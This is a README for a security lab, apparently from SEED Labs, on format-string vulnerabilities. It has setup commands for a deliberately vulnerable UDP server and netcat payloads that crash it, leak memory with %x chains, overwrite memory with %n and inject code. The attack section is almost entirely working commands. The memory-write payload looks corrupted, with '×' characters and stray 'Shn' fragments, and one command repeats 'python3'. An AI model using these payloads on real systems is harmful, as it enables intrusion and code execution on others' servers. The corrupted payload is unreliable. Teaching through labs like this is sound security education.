# Formatted-String-Vulnerability-Attack
Using formatted strings to let the attacker send a arbitrary code to the server and execute it for wrong doings.

## Attacker(Client) can perform following attacks to the formatted string vulnerable server by passing arbitary code
- Crash the program
- Read the internal memory of the program
- Modify the internal memory of the program
- Introducing malicious code into the victims program

### Pre requisite
- Linux VM [Recommended- Ubuntu 16.04 VM (https://seedsecuritylabs.org/labsetup.html)]

### Server
##### Compile the server on 32 bit machine
```
gcc -z execstack -o server server.c
```
##### Compile the server on 64 bit machine
```
gcc -m32 -z execstack -o server server.c
```

#### Start the UDP server
```
./server
```

## Sending message from client to server
##### Using the terminal
```
nc -u IP_ADDRESS PORT
i.e: nc -u 10.0.2.4 9090
```
##### Using the file- `filename`
```
nc -u IP_ADDRESS PORT < filename
i.e: nc -u 10.0.2.4 9090 < filename
```

### Attack
#### Crash the server
```
echo %s%s | nc -u 10.0.2.4 9090
```

#### Read the internal memory of the program
- Using Python Script
```
python3 python3 Memory_access.py
```
```
nc -u 10.0.2.4 9090 < badfile
```

- Using Commandline
```
echo $(printf "BBBB").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x | nc -u 10.0.2.4 9090
```

#### Modify the internal memory of the program
Attacker can modify the internal memory by passing the target address as the arbitary code to the message
```
echo $(printf "\x40\xa0\x04\x08")%.8x%.8×%.8×%.8×%.8×%.8×%.8×%.8×%.8×%.8×%.8x%.8x%.8x%.8x%.8×%.8×%.8×%.8x%.8x%.8x%.8x%.8x%.65245xShn%.103x8hn > input
```
```
nc -u 10.0.2.4 9090 < input
```

#### Introducing malicious code into the victims program
```
python3 build_string.py
```
```
nc -u 10.0.2.4 9090 < badfile
```
